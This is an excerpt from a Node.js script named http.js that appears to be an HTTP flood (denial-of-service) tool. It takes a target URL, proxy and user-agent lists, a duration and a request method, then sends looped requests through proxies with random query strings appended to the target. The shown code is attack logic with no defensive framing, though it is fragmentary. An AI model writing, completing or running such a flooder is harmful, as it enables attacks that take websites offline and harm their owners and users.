...
if (process.argv.length <= 5) {
	console.log("[+] Usage: node http.js <URL> <HTTP_PROXY_FILE> <USERAGENT_FILE> <TIME> <GET/HEAD/POST/RANDOM>");
	process.exit(-1);
}
    ...
    else
    {
        nemo.connect(proxy[1], proxy[0], function() {
            for (var i = 0; i < 10; i++) {
                ...
                randomTargetQuery = target + "?" + randomString(16) + "=" + randomString(8) + "&" + randomString(5) + "=" + randomString(3);
